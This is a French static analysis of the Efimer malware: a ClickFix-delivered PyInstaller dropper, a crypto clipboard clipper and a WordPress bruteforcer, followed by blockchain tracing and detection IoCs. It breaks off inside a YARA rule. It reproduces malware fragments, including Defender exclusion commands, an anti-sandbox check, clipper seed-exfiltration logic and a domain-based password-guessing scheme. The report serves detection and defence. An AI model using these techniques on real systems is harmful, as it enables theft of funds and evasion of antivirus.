# Analyse Efimer : d'un leurre ClickFix à un clipper crypto, un botnet WordPress et une machine de développement identifiée par accident

**Analyste :** Gordon PEIRS
**Date d'analyse :** 15-20/07/2026
**Type :** Analyse statique uniquement (aucune exécution du binaire, aucune connexion à l'infrastructure C2) + OSINT blockchain passif vérifié contre des sources tierces indépendantes (mempool.space, Tronscan, MalwareBazaar)
**Famille :** Efimer (dropper ClickFix, clipper crypto BTC/TRX/XMR, botnet WordPress bruteforcer, MaaS probable)

> Ce document contient l'intégralité du récit analytique (constats, hypothèses, conclusions). La preuve de travail reproductible (commande / pourquoi / sortie brute) est dans [`runbook.md`](runbook.md). Les scripts autonomes sont dans le répertoire [`tools/`](tools/).

---

## 1. Contexte et acquisition

Échantillon récupéré sur [MalwareBazaar](https://bazaar.abuse.ch/) (abuse.ch) par le tag `clickfix`, filtré sur les fichiers `.exe` récents supérieurs à 10 Mo (signature d'un bundle PyInstaller, voir §4.1).

Le vecteur "ClickFix" désigne une famille de leurres web qui affichent une fausse page de vérification ("CAPTCHA", "mise à jour", etc.) et demandent à la victime de coller manuellement une commande PowerShell dans un `Exécuter`. La commande est déjà dans le presse-papiers avant que la victime appuie sur Win+R. L'échantillon analysé est le binaire téléchargé par cette commande, pas la page de distribution elle-même.

Le sample choisi (`a9b5579...`, 14,3 Mo) est l'un des plus de 100 soumis par le reporter `iamaachum` au rythme d'un build par heure depuis le 12/07/2026. Tous partagent le même imphash, tous sont nommés `default.dat`, signe d'une URL de distribution stable qui sert toujours le même nom de fichier.

## 2. Identité de l'échantillon

| Champ | Valeur |
|---|---|
| SHA256 | `a9b557921c40fd625b775e66d6fd99807058133057e94ee7483990f10817fdb4` |
| Taille | 14 307 328 octets |
| Type | PE32+, console, x86-64 |
| Imphash | `dcaf48c1f10b0efa0a4472200f3850ed` (identique sur les 100+ échantillons MalwareBazaar) |
| Nom de fichier observé | `default.dat` (URL de distribution), ou renommé en `.exe` |
| Première observation | 2026-07-12 19:52 UTC (tag `efimer` attribué par le reporter) |
| Tags MalwareBazaar | `efimer`, `clickfix`, `exe` |
| Première observation de ce build précis | 2026-07-15 08:52 UTC |

## 3. Outillage

- `file`, `pefile` (Python), pour l'identification PE et l'inspection des imports
- [`pyinstxtractor`](https://github.com/extremecoders-re/pyinstxtractor) : extraction du bundle PyInstaller
- [`Pyarmor-Static-Unpack-1shot`](https://github.com/Lrdcq/pyarmor-static-unpack-1shot) v0.4.0 : extraction statique de la clé AES PyArmor depuis la DLL runtime
- [`pycdc`](https://github.com/zrax/pycdc) (Decompyle++) : décompilation du bytecode Python 3.13
- `dis` (module stdlib Python) : désassemblage bytecode en complément, pour les fonctions que pycdc refuse de restituer
- Lecture directe des APIs MalwareBazaar, mempool.space, Tronscan, WalletExplorer : pour le OSINT blockchain

Tout le travail a été effectué en local, sans exécution du binaire ni installation en VM. `chmod -x` systématique dès la récupération.

---

## 4. Contournement PyArmor 8.x et extraction du bytecode

### 4.1 Structure du bundle PyInstaller

`pyinstxtractor` extrait 37 fichiers depuis le bundle (PyInstaller 5.13.2, Python 3.13). Trois fichiers retiennent l'attention immédiatement :

- `installer.pyc` : le module principal, logique d'installation
- `pyarmor_runtime.pyd` : 625 Ko, la DLL runtime PyArmor 8.x
- `campus.py` : module Python dont l'analyse montrera plus loin qu'il n'est **jamais importé** depuis `installer.pyc` et que sa présence est un accident

Tentative de décompilation directe d'`installer.pyc` : `ValueError: bad marshal data`. Cause : Python 3.13 a étendu le header `.pyc` de 12 à 16 octets. Corrigé en ajustant l'offset de lecture (`marshal.loads(data[16:])`). La structure tombe, mais `co_code` ne révèle qu'un chargement du runtime PyArmor et un appel à `__pyarmor__` : tout le bytecode réel dort dans un blob opaque de 42 386 octets.

### 4.2 Extraction statique de la clé AES PyArmor

PyArmor 8.x chiffre le bytecode en AES-CBC. La clé et le nonce de déchiffrement sont présents en clair dans `pyarmor_runtime.pyd` : PyArmor les charge au runtime depuis des tables statiques, ce qui les rend récupérables sans exécution.

`Pyarmor-Static-Unpack-1shot` localise ces tables et retourne :

```
[+] AES key : ab738f35ffce23b13ae73d5a2c17a896
[+] Nonce   : 692e6e6f6e2d70726f666974  → "i.non-profit"
```

Le nonce `i.non-profit` identifie la licence PyArmor comme **non-commerciale** (plan "Non-commercial", gratuit pour usage personnel). Une licence gratuite, dont le watermark est gravé dans l'outil censé protéger un voleur.

Le bytecode déchiffré et décompilé par `pycdc` donne le source Python partiel d'`installer.pyc`.

### 4.3 Clé XOR et constantes globales

Les premières constantes lisibles dans le source décompilé fournissent l'essentiel :

```python
XOR_KEY          = 'Is8xqLVw7pTB'          # 12 octets, clé de tous les payloads
MYBASE_FOLDER    = 'C:\\Users\\Public\\Videos\\'
GEOINFO_URL      = 'https://ipinfo.io/country'
DRIVE_LETTERS    = ['D', 'E', 'F', 'G', 'X', 'Y', 'Z']
```

La clé XOR est homogène sur les 100+ échantillons MalwareBazaar (imphash identique, même bootloader), ce qui en fait un indicateur stable.

---

## 5. `daily_random_slug()` : algorithme de nommage reconstitué depuis le bytecode

`pycdc` refuse de décompiler `daily_random_slug()` (`# WARNING: Decompyle incomplete`). La fonction est cependant entièrement lisible dans le désassemblage brut (`dis.dis()`), opcode par opcode.

L'algorithme :

```python
import time, hashlib, random

def daily_random_slug(N):
    vowels     = 'aeiou'
    consonants = 'bcdfghjklmnpqrstvwxyz'
    day        = int(time.time() // 86400)      # numéro de jour UTC
    seed_int   = int(hashlib.sha256(f"{day}-{N}".encode()).hexdigest(), 16) % 0x100000000
    rng        = random.Random(seed_int)
    return ''.join(rng.choice(consonants) + rng.choice(vowels) for _ in range(4))

# N=0 : dossier C:\Users\Public\Videos\[slug]\
# N=1 : nom de la tâche planifiée principale
# N=2 : nom du fichier .js du clipper
```

La graine est le SHA256 de la chaîne `"<jour_UTC>-<N>"` tronqué à 32 bits, injecté dans un `random.Random` dédié. Résultat : 8 caractères alternés consonne/voyelle (CVCVCVCV), déterministe à la journée, imprévisible sans l'algorithme, **trivial à précomputer sur toute plage de dates future** dès lors qu'on connaît l'algorithme.

Conséquence directe : pour la date du sample analysé (2026-07-15), les chemins exacts sont calculables sans exécuter le malware :

| N | Slug | Chemin résultant |
|---|------|-----------------|
| 0 | `rikarajo` | `C:\Users\Public\Videos\rikarajo\` |
| 1 | `xuqicino` | tâche planifiée `\xuqicino` |
| 2 | `jahujaxo` | `C:\Users\Public\Videos\rikarajo\jahujaxo.js` |

La table complète du 12 au 31 juillet 2026 est en §15.

---

## 6. Payloads chiffrés : déchiffrement et identification

### 6.1 Déchiffrement XOR

La clé `Is8xqLVw7pTB` (12 octets, répétée) appliquée aux sept fichiers de `data_p002/` :

| Fichier | Magic déchiffré | Nature |
|---------|----------------|--------|
| `uusd.exe` | `MZx\x00` | PE32+ exécutable |
| `002_n.js` | `var ` | JavaScript WScript (clipper) |
| `002_b.js` | `var ` | JavaScript WScript (bruteforcer WP) |
| `002a.txt` | UTF-8 BOM + `1` | Liste d'adresses BTC P2PKH |
| `002w.txt` | `aban` | Liste BIP39 (abandon...) |
| `002.xml` | `\xff\xfe<` | XML UTF-16 LE |
| `pack.js` | `func` | Template JavaScript |

### 6.2 `uusd.exe` : le démon Tor embarqué

8,6 Mo, PE32+, entropie basse (`text` 6,06, `.rdata` 5,67, section `.buildid` 0,56), non packé. `strings` remonte immédiatement les diagnostics du projet Tor :

```
Trusted %d dirserver at %s:%d (%s)
Tor can't help you if you use it wrong!
localhost:9050
Rend stream is %d seconds late. Giving up on address '%s.onion'
```

`uusd.exe` est littéralement le démon Tor, version officielle compilée via LLVM/Clang (section `.buildid` RSDS). Sa présence explique l'infrastructure C2 : le malware n'a besoin d'aucune installation Tor existante sur la machine, il apporte la sienne.

### 6.3 `002.xml` : persistance par tâche planifiée

XML UTF-16 LE, template Task Scheduler. Points essentiels :

- Exécution **toutes les minutes** (`<Interval>PT1M</Interval>`) pour une durée quasi-infinie (~4 ans)
- `<GroupId>S-1-5-4</GroupId>` + `<RunLevel>LeastPrivilege</RunLevel>` : aucun droit administrateur requis
- `StartBoundary` fixée au passé (`2025-06-01`) pour un démarrage immédiat à l'enregistrement
- Les placeholders `%FOLD%` et `%NAME%` sont remplacés par l'installeur avant l'écriture sur disque

### 6.4 `002w.txt` et `002a.txt`

`002w.txt` : 2 047 lignes, de `abandon` à `zoo`, la liste BIP39 complète. `002a.txt` : 39 998 lignes au format `1...` (Bitcoin P2PKH Legacy), les adresses de remplacement du clipper. La distribution de ces 40 000 adresses inclut aussi des Bech32 (`bc1q`), Bech32m (`bc1p`) et TRX (`T...`).

---

## 7. Le clipper crypto (`002_n.js`)

### 7.1 Désobfuscation du tableau de chaînes

Le script est protégé par `obfuscator.io` : 289 chaînes stockées dans un tableau central, accédé par `_0xXXXX(0xNN)`, le tableau étant rotationné d'un offset calculé par une IIFE au démarrage.

Deux pièges rencontrés lors de la résimulation en Python :

- La regex initiale cherchait `while(![])`, le code utilise `while(!![])` (double négation, valeur truthy). Aucune capture tant que ce n'est pas corrigé.
- `parseInt()` en JavaScript retourne `NaN` pour une chaîne non numérique (contribue zéro à la somme). `int()` Python lève une `ValueError`. Simulation correcte : `try/except ValueError` qui retourne 0.

Résultat une fois corrigé : rotation de 87 positions, 289 chaînes résolues, toute la logique devient lisible.

### 7.2 Boucle de surveillance du presse-papiers

Polling toutes les 500 ms. Trois branches indépendantes :

```javascript
// Branche 1 : accumulation de seed BIP39
CheckWordInBip39(cdata)  →  bip_n++, bip_w += word
// dès 12 mots accumulés → PingToOnion('SEED', seed) + 5 screenshots

// Branche 2 : détection de clé privée brute
CheckStrForPKey(cdata)   →  PingToOnion('SEED', pkey) + screenshot

// Branche 3 : remplacement d'adresse
GetReplacementAddr(cdata) →  SetClipboard(addr_attaquant) + PingToOnion('clip', ...)
```

**Accumulation inter-événements** : les 12 mots BIP39 sont collectés sur des événements de copie successifs, pas en un seul bloc. Une victime qui saisit sa phrase mnémonique mot par mot déclenche la détection sans qu'aucun copier individuel ne soit suspect.

### 7.3 Couverture des devises et mécanisme MakeREPL

| Format ciblé | Détection |
|---|---|
| BTC P2PKH (`1...`) | `charAt(0) === '1'`, longueur 32-36 |
| BTC P2SH (`3...`) | `charAt(0) === '3'`, longueur 32-36 |
| BTC P2WPKH/P2WSH (`bc1q...`) | `substr(0,4) === 'bc1q'`, longueur 40-64 |
| BTC Taproot (`bc1p...`) | `substr(0,4) === 'bc1p'`, longueur 40-64 |
| TRX | `charAt(0) === 'T'`, longueur exacte 34 |
| XMR | `charAt(0) === '4'` ou `'8'`, longueur exacte 95 |

ETH (`0x...`), Solana, Litecoin et Dogecoin ne sont pas gérés. Ce n'est pas un oubli : l'essentiel des flux USDT à l'international transite sur TRC-20 (TRON), pas ERC-20 (Ethereum), précisément pour les frais dérisoires de TRON. La cible est BTC (valeur) + TRX (USDT volumétrique) + XMR (intraçable).

`MakeREPL` rend le remplacement visuellement indétectable : pour chaque adresse victime, la fonction cherche dans les 40 000 adresses de la liste celle qui partage le plus de caractères finaux. Une victime qui vérifie les 2-4 derniers caractères avant d'envoyer observe une correspondance parfaite.

### 7.4 Infrastructure C2 Tor : trois clés ed25519 recalculées

Deux adresses `.onion` dans `002_n.js`, une troisième dans `002_b.js`. Une adresse Tor v3 encode dans ses 56 caractères base32 la clé publique ed25519 du serveur (32 octets), un checksum SHA3-256 (2 octets) et la version `0x03`. Décodage et vérification des checksums sur les trois :

| Rôle | Adresse `.onion` | ed25519 (hex) |
|------|-----------------|---------------|
| Clipper exfil/commandes | `hek5ensy7wqqls2...eeyid.onion/route.php` | `3915d23658fda105cb42014ab41e5f90e11e0ed7a5f9fabf6afbcc529012bc8a` |
| Clipper mises à jour | `swjxev2rvxfivi2w...yead.onion/core/repla.php` | `9593725751adca8aa356aaaf1276a0ba92423ef9bd41ca730366a015040a3fac` |
| Bruteforcer WP | `gfoqsewps57xcyx...b3ad.onion/route.php` | `315d0912cf977f7162ee20d64d187ddbbc9693d8eb61d21f5d6515285b349e61` |

**Trois clés distinctes** : trois serveurs (ou identités) indépendants. Les adresses `.onion` v3 ne sont pas sinkholeables, elles sont cryptographiquement liées à la clé privée correspondante. Les clés ed25519 sont des IoCs plus stables que les adresses : si le serveur tourne son adresse en conservant la même clé privée, la continuité reste traçable.

---

## 8. Le bruteforcer WordPress (`002_b.js`)

### 8.1 Architecture multi-thread pilotée par C2

`002_b.js` n'est **pas** déployé par l'installeur Python au moment de l'installation, il est livré sélectivement via une commande C2 (`EVAL`) sur les machines choisies par l'opérateur. Les cibles ne sont pas hardcodées : elles proviennent de `config['brute_dom_stack']` poussé par le C2 à la demande.

```
20 workers CHECK  →  GET /xmlrpc.php → HTTP 200 ?
                      User-Agent : rotation aléatoire sur 12 UA réels (Chrome/Firefox/Edge)
                      si oui : domaine passé au pool BRUTE

40 workers BRUTE  →  WPGetUsers() : GET /wp-json/wp/v2/users (énumération auteurs)
                      genDomainPwd(domain) : jusqu'à 60 variantes de mot de passe
                      blogger.newPost (XML-RPC, méthode héritée supportée par WordPress)
                      succès → PingToOnion('GOOD', domain|user|pass)
```

La méthode XML-RPC choisie est `blogger.newPost`, une méthode héritée de l'API Blogger ancienne, supportée par WordPress mais distincte de `wp.newPost`. Elle contourne certains filtres qui bloquent spécifiquement les endpoints WordPress natifs.

### 8.2 Génération de mots de passe par domaine

```javascript
function genDomainPwd(domain) {
    // Pour "example.com" : base = "example"
    // → leetspeak (e→3, a→@, i→1, o→0, s→$)
    // → variations de casse (original / capitalize / upper)
    // → combinaisons préfixe+TLD, suffixe+TLD
    // → 60 variantes max par domaine
}
```

La prémisse est statistiquement solide : une proportion non négligeable d'administrateurs WordPress choisissent un mot de passe dérivé de leur nom de domaine.

---

## 9. L'installeur Python : déploiement, évasion, persistance

### 9.1 Anti-sandbox

```python
def check_sandbox_fast():
    recent = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Recent')
    count = len(os.listdir(recent))
    return count < 32   # True = sandbox → abort
```

Si `%APPDATA%\Microsoft\Windows\Recent` contient moins de 32 fichiers, l'installeur abandonne sans laisser de trace. Un environnement sandbox fraîchement provisionné a un historique vide ou quasi-vide. Une machine réelle utilisée depuis des mois ne l'a jamais.

### 9.2 Contournement Defender

```python
# Exclusions de chemin
Add-MpPreference -ExclusionPath CUREXE_FOLDER
Add-MpPreference -ExclusionPath TARGET_FOLDER     # C:\Users\Public\Videos\[slug]\
Add-MpPreference -ExclusionPath USRTEMP_FOLDER
Add-MpPreference -ExclusionPath D:\, E:\, ..., Z:\

# Exclusions de processus
Add-MpPreference -ExclusionProcess C:\Windows\System32\cmd.exe
Add-MpPreference -ExclusionProcess C:\Windows\System32\clip.exe
```

L'exclusion de `cmd.exe` et `clip.exe` protège à l'avance les outils système que les scripts JS invoquent pour manipuler le presse-papiers. Defender ne bloque pas le malware lui-même : l'installeur lui demande poliment de regarder ailleurs avant d'agir.

### 9.3 Géo-filtre côté serveur uniquement

```python
country = subprocess.run(
    ['curl', '-s', '--max-time', '10', 'https://ipinfo.io/country'],
    capture_output=True, text=True, creationflags=CREATE_NO_WINDOW
).stdout.strip()[:2].upper()
open(os.path.join(TARGET_FOLDER, 'cinfo.inf'), 'w').write(country)
```

Il n'y a **pas** de filtre géographique côté client. La fonction écrit simplement le code pays dans `cinfo.inf` et l'installation continue systématiquement. Le vrai filtre est côté serveur : le C2 reçoit `&GEIP=XX` à chaque ping et décide si la victime mérite une réponse active.

### 9.4 Flux d'exécution complet

```
1. check_sandbox_fast()         → <32 fichiers Recent → abort
2. makedirs(TARGET_FOLDER)      → C:\Users\Public\Videos\[slug]\  (attribut HIDDEN)
3. Add-MpPreference ×5          → exclusions paths + processus
4. GUID creation
5. extract_data('uusd.exe')     → copie dans TARGET_FOLDER
6. extract_data('002a.txt')     → adresses clipper
7. get_crypto_user()            → scan portefeuilles bureau (12 familles)
8. get_country_code()           → cinfo.inf
9. obfsc_script(002_n.js)       → ré-obfuscation dynamique (identifiants uniques par infection)
10. build_script(002_n.js)      → remplissage des placeholders %P% et %D% dans pack.js
11. outfile_data(TASK1.js)      → C:\Users\Public\Videos\[slug]\[task1].js
12. outfile_data(TASK1.xml)     → écriture du template XML personnalisé
13. add_to_schtask()            → schtasks /create /xml
14. add_to_startup()            → HKCU\...\Run [TASK1] = wscript.exe "<path>"
```

`002_b.js` n'apparaît pas dans ce flux : livraison sélective par C2 uniquement.

**Obfuscation dynamique (étape 9)** : chaque infection génère une variante unique du script JS. Aucun hash de fichier sur disque n'est stable entre deux victimes. Les IoCs fichier-based sont inopérants entre machines.

---

## 10. `campus.py` : fuite OPSEC de l'environnement de build

### 10.1 Découverte du module

`campus.py` est présent dans le bundle PyInstaller mais jamais importé depuis `installer.pyc`. Son contenu : une variable `data` contenant ~511 Ko de base64. Décodé, on obtient 383 641 octets avec le magic `52 61 72 21 1a 07 01 20`, soit le magic RAR5 valide sauf un octet (`0x20` en position 7 au lieu de `0x00`).

### 10.2 Restauration de l'archive RAR5

Première tentative : patcher seulement le byte 7. `7z` retourne `ERROR: Can not open the file as archive`. Le problème est plus profond : l'archive entière a subi une transformation **cp1252 vers UTF-8** avant d'être stockée en base64, chaque octet haut (`0x80`-`0xFF`) converti en séquence UTF-8 à deux octets, gonflant les 247 Ko d'origine en 383 Ko.

Tentative avec `errors='replace'` : échoue aussi. Cinq points de code Unicode non définis en cp1252 (U+0081, U+008D, U+008F, U+0090, U+009D) sont remplacés par `0x3F` (`?`), corrompant les blocs RAR correspondants.

Solution : un handler d'encodage personnalisé qui retourne `cp & 0xFF` pour tout code point entre `0x80` et `0xFF`, annulant exactement la transformation. Après restauration et patch du byte 7, les deux premiers fichiers de l'archive s'extraient correctement (les suivants ont des CRC invalides, leurs headers étant dans les zones les plus corrompues) :

| Fichier | Taille | Mtime |
|---------|--------|-------|
| `pyinstaller-6.20.0/bootloader/build/.lock-waf_win32_build` | 3 415 octets | 2026-05-30 17:43 UTC |
| `pyinstaller-6.20.0/bootloader/build/config.log` | 36 285 octets | 2026-05-30 18:02 UTC |

Une recherche supplémentaire sur les headers des 52 fichiers inaccessibles (noms stockés en clair dans la structure RAR5, lecture binaire directe) donne l'inventaire complet : 21 sources C + 6 sources zlib + leurs objets compilés respectifs (`.c.o`), en deux variantes de build (`release/` et `releasew/`). Ce sont les sources standard du bootloader PyInstaller 6.20.0, aucun fichier personnalisé.

### 10.3 Ce que les fichiers extraits révèlent

Le fichier `.lock-waf_win32_build` (format Python repr, généré par WAF) contient l'environnement de compilation complet :

| Information | Valeur |
|-------------|--------|
| Hostname | `DESKTOP-UOB4Aig` |
| Utilisateur | `User` |
| Domaine | `DESKTOP-UOB4Aig` (workgroup, pas un domaine AD) |
| CPU | `Intel64 Family 6 Model 198 Stepping 2, GenuineIntel` |
| Nombre de processeurs | 8 |
| Commande de build | `./waf distclean configure all --gcc` |
| Chemin de build | `C:\Users\User\Desktop\pyinstaller-6.20.0\` |
| Stack installée | Python 3.13, Node.js, Go, LLVM (à `C:\llvm-msys64\`), MSYS2 (à `C:\msys64\`), VS Code, WireGuard VPN, OneDrive |
| Date de build | 2026-05-30 04:49:41 UTC (contenu `config.log`) |

`Intel64 Family 6 Model 198` correspond à la microarchitecture **Arrow Lake** (Intel Core Ultra 200 series, sortie octobre 2024), soit une machine haute gamme achetée 6 mois avant ce build. `NUMBER_OF_PROCESSORS = 8` sur Arrow Lake (qui a supprimé l'Hyper-Threading) signifie 8 cœurs physiques réels, pas un cloud VM (ceux-ci exposent généralement 2 ou 4 vCPUs). C'est une **machine personnelle physique**, probablement de développement ou de jeu.

Le build a été lancé depuis `C:\Users\User\Desktop\`, pas depuis un répertoire structuré. Signe d'un build ad hoc, pas d'un pipeline CI/CD.

`config.log` confirme le compilateur : `waf 2.0.20`, GCC (MinGW/MSYS2), pas MSVC (les nombreuses chaînes `MSVC` dans ce fichier sont des sondes de configuration que WAF teste au démarrage, elles ne reflètent pas le compilateur final).

### 10.4 Ce que l'analyse binaire du stream n'a pas pu extraire

Les fichiers `.c.o` compilés par GCC embarquent normalement en clair (section `.comment`) la version exacte du compilateur, et en DWARF (section `.debug_info`, `DW_AT_comp_dir`) le chemin absolu de compilation. Ces informations auraient permis de dater précisément la toolchain MSYS2 et de confirmer le chemin `C:\Users\User\Desktop\`. Mais tous les contenus de fichiers sont **compressés** dans le stream RAR5 (LZ77+Huffman ou PPMd par défaut) : seuls les headers de noms de fichiers sont en clair. Les versions GCC et chemins DWARF sont inaccessibles sans décompression fonctionnelle.

**[OUVERT]** : la version exacte de GCC/MinGW utilisée n'a pas pu être déterminée.

---

## 11. Intelligence de campagne

### 11.1 MalwareBazaar : 100+ échantillons en 5 jours

La requête par tag `efimer` retourne 100 résultats (limite de l'API). Caractéristiques communes :

- Filename `default.dat` (100%), URL de distribution stable
- Imphash `dcaf48c1f10b0efa0a4472200f3850ed` (100%), même bootloader PyInstaller
- Signature ClamAV `SecuriteInfo.com.Variant.Dropper.354.UNOFFICIAL`
- SSDEEP : préfixe variable (environ 1 Ko, correspondant à la liste d'adresses `002a.txt` régénérée à chaque build) + suffixe identique sur les 13 Mo restants (Tor daemon + runtime Python = contenu constant)

Cadence : **un build par heure**, quasiment à la même minute (`XX:52 UTC`), du 2026-07-12 au 2026-07-17. Une seule interruption de 8 heures, le 2026-07-16 entre 08:52 et 16:52. Le pattern régulier pointe vers un pipeline de build automatisé, pas vers une compilation manuelle.

La variation de taille entre builds (±90 Ko) est cohérente avec une liste `002a.txt` légèrement différente à chaque itération.

### 11.2 OSINT blockchain : wallets hardcodés

Les adresses hardcodées dans les scripts JS sont les **adresses de repli** : elles ne s'activent que si `002a.txt` est vide ou en cours de téléchargement. L'essentiel des fonds transiterait par les 40 000+ adresses de la liste.

| Adresse | Type | Total reçu | Première TX |
|---------|------|-----------|-------------|
| `12FfZsjyDri1ir3EUU85pRE5quUEPY5Qf4` | BTC P2PKH | 0.00028 BTC | 2026-01-26 |
| `32ozR62LxL6ynHYBHZhCz5faRjhYrmNheW` | BTC P2SH | 0 BTC | jamais utilisée |
| `bc1qz33n9xuqkxl7wxy8j0n4haapr73w64umdj7tw0` | BTC P2WPKH | 0.00551 BTC | 2025-03-26 |
| `TAwHPzmZC7rvCKiLmRnr458xZH1D8M5c82` | TRX | ~375 USDT | 2026-05-13 (création) |
| `87Y35DbRFf2G2...` | XMR | non vérifiable (Monero) | |

Le wallet `bc1qz33n9...` est actif depuis mars 2025, soit 16 mois d'activité confirmée avant la campagne actuelle.

### 11.3 Chaîne TRX et destination FixedFloat

Reconstruction complète des mouvements USDT-TRC20 :

```
TPBsXfpPP39... (exchange A, 707k TX)
  → 24.09 USDT  2026-02-05
  → 11.54 USDT  2026-01-21
                                        } TAwHPzmZC7rv... (wallet attaquant)
THxrXKAVxYej... (relais, 243 TX)
  → 10.01 USDT  2026-03-30

TTgSknazmXS4... (créé 2026-04-20, 68 TX)
  → 330.00 USDT 2026-05-04  ← paiement entrant d'un tiers

TAwHPzmZC7rv... → 375.64 USDT  2026-05-13
  → TY9wnbgAynRMse2U... (relais éphémère, créé le même jour, 11 TX)
    → TDoXUNZ6PajKuiUkcYg3EDSV9bnqGqsbcf  (FixedFloat hot wallet)
```

`TTgSknazmXS4` : créé le 2026-04-20, 68 transactions, volume de plusieurs milliers d'USDT concentré sur quelques journées. Les 330 USDT envoyés à l'attaquant le 2026-05-04 correspondent à un **paiement pour un service**, vraisemblablement l'accès au botnet ou au dropper (modèle MaaS).

`TDoXUNZ6PajKuiUkcYg3EDSV9bnqGqsbcf` est identifié publiquement par Tronscan comme **FixedFloat Exchange Hot Wallet** (10,9 millions de transactions, actif depuis 2020-05-26). FixedFloat est un exchange non-custodial sans obligation KYC systématique, régulièrement utilisé pour convertir des crypto sans traçabilité.

### 11.4 Origine des fonds BTC : exchanges soumis au KYC

Remontée des inputs de chaque transaction vers `bc1qz33n9...` :

| Date | Montant | Adresse source | Volume de la source |
|------|---------|---------------|---------------------|
| 2025-03-26 | 0.00096 BTC | `bc1qm34lsc65zpw79lxes69zkqmk6ee3ewf0j77s3h` | 59 571 438 BTC / 2,27M TX |
| 2025-11-15 | 0.00010 BTC | `1NYozKvRYkxSYpaqFWuyoajYtqEd3y3Kqh` | 0.08 BTC / 45 TX |
| 2026-05-30 | 0.00444 BTC | `bc1qx9n80t5q7...` (exchange) via relais `bc1qgrnp6...` | 628 396 BTC / 18 675 TX |

`bc1qm34` (59M BTC, 2,27M TX) et `bc1qx9n80` (628k BTC, cluster de 1 448 adresses, modèle de retrait 1-vers-N) sont des hot wallets d'exchanges soumis aux obligations KYC. L'attaquant a effectué des retraits depuis ses comptes sur ces deux plateformes. Une réquisition judiciaire à ces exchanges révélerait les documents d'identité, l'adresse IP de connexion et le compte bancaire de sortie.

Le dépôt du 2026-05-30 est notable : c'est le même jour que la compilation du bootloader dans `campus.py` (2026-05-30 04:49 UTC). L'attaquant a reçu des fonds et compilé son prochain lanceur le même jour.

**[OUVERT]** : le nom exact de ces deux exchanges n'a pas pu être déterminé sans compte Arkham Intelligence, OKLink ou Bitquery. Le profil de volume est cohérent avec des plateformes de premier rang (Binance, Coinbase, Kraken ou équivalent).

Chaîne de retrait BTC confirmée : `bc1qz33n9...` vers `bc1q5acrlm...` (intermédiaire, vidé en 1h30) puis vers `bc1qns9f7dz2g7m2hf5x8yxvk2r3f5lkl9w` (15,2 millions de BTC reçus, pool d'exchange de premier rang, probablement Binance).

### 11.5 Infrastructure `002a.txt` : activations TRX et ancienneté

Sur un échantillon de 60 adresses TRX de `002a.txt` : 9 ont reçu une transaction (activation), toutes avec exactement 1 sun (0.000001 TRX), le minimum requis pour créer un compte TRON actif et lui permettre de recevoir des USDT-TRC20.

Quatre wallets activateurs identifiés :

| Wallet activateur | Créé le | TX totales | Actif depuis |
|-------------------|---------|-----------|--------------|
| `TGDT6PM2sPg36yhMTQUwK4vRZmkkBNYJqp` | 2023-09-26 | 646 | Octobre 2023 |
| `TPLNsBzDQymUN2XVps9uJoheTvhsCh1A6m` | 2023-11-11 | 874 | Novembre 2023 |
| `TXv1c95gwYNiGvX7efDdn2bgQCgb9152xY` | 2021-06-21 | 976 | Juin 2021 |
| `TVM8FEghNqnMP4zsy2A92T8dcaSNycbmP5` | 2022-07-04 | 1 773 | Juillet 2022 |

`TGDT6PM2` active des adresses depuis octobre 2023, soit 33 mois avant la campagne actuelle. Sur ses 646 transactions, une seule appartient au fichier `002a.txt` de ce build : les autres correspondent à des builds antérieurs. Cette infrastructure n'a pas été créée pour Efimer : elle l'a précédé.

Tronscan marque toutes ces adresses activées avec `riskTransaction: true` / `noteLevel: 3` : la détection blockchain de TRON a déjà flagué ces adresses.

---

## 12. Détection et disruption

### 12.1 Table d'IoCs journaliers

L'algorithme `daily_random_slug()` (§5) permet de précomputer les noms de fichier et de tâche planifiée pour n'importe quelle date :

| Date | Dossier (N=0) | Tâche (N=1) | Clipper (N=2) | Chemin JS |
|------|--------------|------------|----------------|-----------|
| 2026-07-12 | `dovuyoja` | `fijaxifu` | `ciboqigo` | `C:\Users\Public\Videos\dovuyoja\ciboqigo.js` |
| 2026-07-13 | `movekana` | `qobaguso` | `fobalasi` | `...\movekana\fobalasi.js` |
| 2026-07-14 | `vikofiqi` | `dileruro` | `lesoduli` | `...\vikofiqi\lesoduli.js` |
| 2026-07-15 | `rikarajo` | `xuqicino` | `jahujaxo` | `...\rikarajo\jahujaxo.js` |
| 2026-07-16 | `loqejidi` | `ciwimuma` | `yocayawa` | `...\loqejidi\yocayawa.js` |
| 2026-07-17 | `yoyumeme` | `kiwayowi` | `vusuzuta` | `...\yoyumeme\vusuzuta.js` |
| 2026-07-18 | `lohocada` | `pepepuxe` | `loxahefe` | `...\lohocada\loxahefe.js` |
| 2026-07-19 | `pilewehu` | `luhitapi` | `cisakuvi` | `...\pilewehu\cisakuvi.js` |
| 2026-07-20 | `juhugoxe` | `qugusesa` | `tedisevo` | `...\juhugoxe\tedisevo.js` |
| 2026-07-21 | `vuzowuno` | `qexodeve` | `vuyukuvu` | `...\vuzowuno\vuyukuvu.js` |
| 2026-07-22 | `dusunuke` | `zolofike` | `miceguti` | `...\dusunuke\miceguti.js` |
| 2026-07-23 | `bihutapo` | `rifideda` | `defopavi` | `...\bihutapo\defopavi.js` |
| 2026-07-24 | `cuvegedi` | `fizaweve` | `fudapomo` | `...\cuvegedi\fudapomo.js` |
| 2026-07-25 | `vihomosi` | `dujijile` | `kayirile` | `...\vihomosi\kayirile.js` |
| 2026-07-26 | `keqeyuqa` | `lezawuta` | `hecohaxe` | `...\keqeyuqa\hecohaxe.js` |
| 2026-07-27 | `diwenoye` | `cimohuyi` | `gonetele` | `...\diwenoye\gonetele.js` |
| 2026-07-28 | `nokowala` | `badugasi` | `horexuzo` | `...\nokowala\horexuzo.js` |
| 2026-07-29 | `dufefosa` | `hoyaqonu` | `gotayiko` | `...\dufefosa\gotayiko.js` |
| 2026-07-30 | `mimilesa` | `naxenevi` | `fiwuzesu` | `...\mimilesa\fiwuzesu.js` |
| 2026-07-31 | `ceteqowu` | `xexohadu` | `nutaxise` | `...\ceteqowu\nutaxise.js` |

Le script de génération est dans [`tools/`](tools/). Un SOC peut précharger la semaine suivante dans ses règles de détection sans attendre d'observer une infection.

### 12.2 Règle YARA

```yara
rule Efimer_Dropper_PyInstaller_PyArmor {
    meta:
        description    = "Efimer clipper/WordPress botnet dropper, ClickFix campaign"
        author         = "Gordon PEIRS"
        date           = "2026-07-15"
        sample         = "a9b557921c40fd625b775e66d6fd99807058133057e94ee7483990f10817fdb4"
        imphash        = "dcaf48c1f10b0efa0a4472200f3850ed"
        campaign_start = "2026-07-12"
        tlp            = "WHITE"

    strings:
